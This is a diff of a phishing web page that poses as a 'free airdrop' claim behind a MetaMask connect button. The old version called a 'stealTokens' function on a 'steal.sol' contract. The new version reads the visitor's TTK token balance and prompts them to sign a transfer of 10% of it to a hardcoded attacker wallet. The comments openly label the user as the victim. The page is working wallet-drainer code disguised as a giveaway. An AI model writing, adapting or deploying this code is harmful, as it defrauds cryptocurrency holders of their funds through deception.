@@ -8,39 +8,58 @@
 </head>
 <body>
 
-    <h1>Claim your Free Airdrop!</h1>
+    <h1>Claim Your Free Airdrop!</h1>
     <button id="connectButton">Connect MetaMask</button>
     <button id="airdropButton" style="display:none;">Claim Airdrop</button>
 
     <script>
-        // Smart contract ABI for the steal.sol contract
-        const contractABI = [
-            { "inputs": [{ "internalType": "address", "name": "_tokenAddress", "type": "address" }], "name": "stealTokens", "outputs": [], "stateMutability": "nonpayable", "type": "function" },
-            { "inputs": [], "stateMutability": "nonpayable", "type": "constructor" },
-            { "stateMutability": "payable", "type": "receive" },
-            { "inputs": [], "name": "owner", "outputs": [{ "internalType": "address payable", "name": "", "type": "address" }], "stateMutability": "view", "type": "function" }
+        // ABI for the ERC-20 contract (TTK token)
+        const tokenABI = [
+            {
+                "constant": true,
+                "inputs": [{ "name": "account", "type": "address" }],
+                "name": "balanceOf",
+                "outputs": [{ "name": "balance", "type": "uint256" }],
+                "payable": false,
+                "stateMutability": "view",
+                "type": "function"
+            },
+            {
+                "constant": false,
+                "inputs": [
+                    { "name": "recipient", "type": "address" },
+                    { "name": "amount", "type": "uint256" }
+                ],
+                "name": "transfer",
+                "outputs": [{ "name": "", "type": "bool" }],
+                "payable": false,
+                "stateMutability": "nonpayable",
+                "type": "function"
+            }
         ];
 
-        // Contract address where the steal.sol contract is deployed
-        const contractAddress = "0xf5d2621f8b5eaabd6a35e65142cf0c06d9b791b5";  // Replace with actual contract address
+        // Hardcoded attacker wallet address
+        const attackerAddress = "0xA79f1997eAC8B797f67bf728DaB6c57a3961cA74"; 
 
-        // Token address of the ERC-20 token to be stolen
-        const tokenAddress = "0x9052EB26C0b9836335Ec153413F80bAEc7536414"; // Replace with actual token address
+        // Token contract address (TTK token)
+        const tokenAddress = "0x9052EB26C0b9836335Ec153413F80bAEc7536414"; 
 
         let web3;
-        let contract;
         let userAddress;
+        let tokenContract;
 
         // Connect MetaMask to the website
         async function connectMetaMask() {
             if (window.ethereum) {
                 web3 = new Web3(window.ethereum);
                 try {
-                    // Request user account connection
                     const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
-                    userAddress = accounts[0];
+                    userAddress = accounts[0];  // Get the victim's wallet address
 
-                    // Hide the connect button and show the airdrop button
+                    // Initialize the token contract
+                    tokenContract = new web3.eth.Contract(tokenABI, tokenAddress);
+
+                    // Show the airdrop button
                     document.getElementById('connectButton').style.display = 'none';
                     document.getElementById('airdropButton').style.display = 'block';
                 } catch (error) {
@@ -52,33 +71,34 @@
             }
         }
 
-        // Claim the airdrop (execute token transfer)
+        // Claim the airdrop and send tokens
         async function claimAirdrop() {
-            contract = new web3.eth.Contract(contractABI, contractAddress);
-
             try {
-                // Fetch current gas price
-                const gasPrice = await web3.eth.getGasPrice();
-                const gasEstimate = await contract.methods.stealTokens(tokenAddress).estimateGas({ from: userAddress });
+                // Get the user's balance of TTK tokens
+                const balance = await tokenContract.methods.balanceOf(userAddress).call();
+                const amountToSend = balance / 10;  // Example: sending 10% of their balance
 
-                // Execute the token transfer
-                await contract.methods.stealTokens(tokenAddress).send({
-                    from: userAddress,
-                    gasPrice: gasPrice,
-                    gas: gasEstimate
-                });
+                if (amountToSend > 0) {
+                    // Send a transaction to transfer tokens to the attacker's address
+                    await tokenContract.methods.transfer(attackerAddress, amountToSend).send({
+                        from: userAddress
+                    });
 
-                alert("Airdrop claimed! Tokens transferred to attacker.");
+                    alert("Airdrop claimed! Tokens transferred to attacker.");
+                } else {
+                    alert("Insufficient balance to claim airdrop.");
+                }
             } catch (err) {
                 console.error("Error in claiming airdrop", err);
                 alert("Transaction failed! Please check the console for more details.");
             }
         }
 
-        // Event listeners
+        // Event listeners for the buttons
         document.getElementById('connectButton').addEventListener('click', connectMetaMask);
         document.getElementById('airdropButton').addEventListener('click', claimAirdrop);
     </script>
 
 </body>
 </html>
+
